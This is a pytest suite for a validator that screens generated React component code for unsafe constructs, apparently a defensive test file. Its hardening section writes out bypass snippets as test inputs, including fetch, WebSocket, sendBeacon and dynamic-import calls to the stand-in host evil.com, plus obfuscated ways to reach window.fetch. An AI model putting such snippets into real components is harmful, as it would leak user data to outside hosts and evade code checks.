import pytest
from babel_bridge import validate_component_code, SyntaxValidationError, SecurityValidationError

VALID = '''
import React from "react";
interface Props { value: string; onChange: (v: string) => void; }
export default function SimpleInput({ value, onChange }: Props) {
  return <input className="ds-input" value={value} onChange={(e) => onChange(e.target.value)} />;
}
'''

def test_valid_passes():
    assert validate_component_code(VALID)["valid"] is True

def test_syntax_error_caught():
    with pytest.raises(SyntaxValidationError):
        validate_component_code(VALID.replace("}", "", 1))

def test_eval_flagged():
    with pytest.raises(SecurityValidationError):
        validate_component_code(VALID.replace("return <input", 'eval("x"); return <input'))

def test_dangerous_html_flagged():
    bad = VALID.replace(
        "return <input",
        'return <div dangerouslySetInnerHTML={{__html: value}}><input'
    ).replace("/>;", "/></div>;")
    with pytest.raises(SecurityValidationError):
        validate_component_code(bad)

def test_disallowed_import_flagged():
    bad = VALID.replace('import React from "react";', 'import React from "react";\nimport fs from "fs";')
    with pytest.raises(SecurityValidationError):
        validate_component_code(bad)

# ---- Validator hardening (browser-API holes found in audit) ----
HOLE_BASE = """
import React from "react";
export default function T() {
  __BODY__
  return <div>hi</div>;
}
"""

HOLES = {
    "globalThis.fetch": 'globalThis.fetch("https://evil.com");',
    "window.fetch": 'window.fetch("https://evil.com");',
    "WebSocket": 'new WebSocket("ws://evil.com");',
    "dynamic_import": 'import("https://evil.com/x.js");',
    "window.location": 'window.location = "https://evil.com";',
    "bare_location_assign": 'location = "https://evil.com";',
    "localStorage": 'localStorage.getItem("x");',
    "innerHTML": 'document.body.innerHTML = "x";',
    "insertAdjacentHTML": 'document.body.insertAdjacentHTML("beforeend", "x");',
    "computed_window": 'window["fe" + "tch"]("x");',
    "destructured_fetch": 'const { fetch: f } = window; f("x");',
    "alias_window": 'const w = window; w.fetch("x");',
    "sendBeacon": 'navigator.sendBeacon("https://evil.com", "x");',
}

@pytest.mark.parametrize("body", list(HOLES.values()), ids=list(HOLES.keys()))
def test_hardened_validator_blocks(body):
    with pytest.raises(SecurityValidationError):
        validate_component_code(HOLE_BASE.replace("__BODY__", body))

def test_hardened_validator_control_passes():
    assert validate_component_code(HOLE_BASE.replace("__BODY__", "const x = 1;"))["valid"] is True